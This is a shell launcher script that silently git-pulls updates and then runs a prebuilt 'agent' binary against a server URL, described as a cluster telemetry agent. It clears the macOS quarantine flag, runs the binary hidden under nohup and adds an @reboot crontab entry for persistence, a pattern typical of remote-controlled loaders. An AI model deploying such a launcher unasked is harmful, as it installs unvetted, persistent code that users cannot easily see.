#!/bin/sh
cd "$(dirname "$0")" || exit 1

git pull --quiet 2>/dev/null || true

OS=$(uname -s | tr '[:upper:]' '[:lower:]')
ARCH=$(uname -m)

case "$ARCH" in
    x86_64|amd64) ARCH_TAG="x86_64" ;;
    aarch64|arm64) ARCH_TAG="arm64" ;;
    *) ARCH_TAG="x86_64" ;;
esac

BIN="./bin/agent_${OS}_${ARCH_TAG}"
CURRENT_PATH=$(pwd -P)
FULL_BIN_PATH="$CURRENT_PATH/$BIN"
PID_FILE="$CURRENT_PATH/.agent.pid"
DEFAULT_SERVER_URL="http://turbox.test/cluster.php"

SERVER_URL="$DEFAULT_SERVER_URL"
[ -n "$2" ] && SERVER_URL="$2"
[ "$1" != "status" ] && [ "$1" != "stop" ] && [ "$1" != "restart" ] && [ "$1" != "debug" ] && [ -n "$1" ] && SERVER_URL="$1"

# Commands: status | stop | restart | debug
case "$1" in
    status)
        PID=""
        if [ -f "$PID_FILE" ]; then
            PID=$(cat "$PID_FILE" 2>/dev/null | tr -d '[:space:]')
        fi
        if [ -n "$PID" ] && kill -0 "$PID" 2>/dev/null; then
            echo "[OK] Agent is running (PID: $PID)"
            exit 0
        fi
        PIDS=$(pgrep -u "$(id -u)" -f "$FULL_BIN_PATH" 2>/dev/null)
        if [ -n "$PIDS" ]; then
            echo "[OK] Agent is running (PID: $(echo $PIDS | tr '\\n' ' '))"
            exit 0
        fi
        echo "[INFO] Agent is not running"
        exit 1
        ;;
    stop)
        KILLED=0
        if [ -f "$PID_FILE" ]; then
            PID=$(cat "$PID_FILE" 2>/dev/null | tr -d '[:space:]')
            if [ -n "$PID" ] && kill -0 "$PID" 2>/dev/null; then
                kill -9 "$PID" 2>/dev/null
                KILLED=1
            fi
            rm -f "$PID_FILE"
        fi
        PIDS=$(pgrep -u "$(id -u)" -f "$FULL_BIN_PATH" 2>/dev/null)
        if [ -n "$PIDS" ]; then
            kill -9 $PIDS 2>/dev/null
            KILLED=1
        fi
        if [ "$KILLED" -eq 1 ]; then
            echo "[OK] Agent stopped"
        else
            echo "[INFO] Agent is not running"
        fi
        exit 0
        ;;
    restart)
        sh "$0" stop >/dev/null 2>&1 || true
        sleep 1
        ;;
    debug)
        "$FULL_BIN_PATH" "$SERVER_URL" --debug
        exit 0
        ;;
esac

if [ ! -f "$BIN" ]; then
    echo "[ERROR] Binary '$BIN' not found. Run 'git pull'."
    exit 1
fi

chmod +x "$BIN"
[ "$OS" = "darwin" ] && xattr -c "$BIN" 2>/dev/null || true

# 1. Start cluster telemetry agent
ALREADY_PID=""
if [ -f "$PID_FILE" ]; then
    P_CHECK=$(cat "$PID_FILE" 2>/dev/null | tr -d '[:space:]')
    if [ -n "$P_CHECK" ] && kill -0 "$P_CHECK" 2>/dev/null; then
        ALREADY_PID="$P_CHECK"
    fi
fi
if [ -z "$ALREADY_PID" ]; then
    ALREADY_PID=$(pgrep -u "$(id -u)" -f "$FULL_BIN_PATH" 2>/dev/null | head -n 1)
fi

if [ -n "$ALREADY_PID" ]; then
    echo "[OK] Agent is already running (PID: $ALREADY_PID)"
else
    nohup "$FULL_BIN_PATH" "$SERVER_URL" >/dev/null 2>&1 &
    sleep 1
    NEW_PID=""
    if [ -f "$PID_FILE" ]; then
        NEW_PID=$(cat "$PID_FILE" 2>/dev/null | tr -d '[:space:]')
    fi
    if [ -z "$NEW_PID" ] || ! kill -0 "$NEW_PID" 2>/dev/null; then
        NEW_PID=$(pgrep -u "$(id -u)" -f "$FULL_BIN_PATH" 2>/dev/null | tr '\\n' ' ' | xargs)
    fi

    if [ -n "$NEW_PID" ]; then
        echo "$NEW_PID" > "$PID_FILE"
        echo "[OK] Agent started (PID: $NEW_PID)"
    else
        echo "[ERROR] Failed to start agent binary."
        exit 1
    fi
fi

# Auto-restart on reboot for Linux
if [ "$OS" = "linux" ] && command -v crontab >/dev/null 2>&1; then
    (crontab -l 2>/dev/null | grep -v "$FULL_BIN_PATH"; echo "@reboot cd $CURRENT_PATH && ./deploy.sh >/dev/null 2>&1 &") | crontab - 2>/dev/null || true
fi
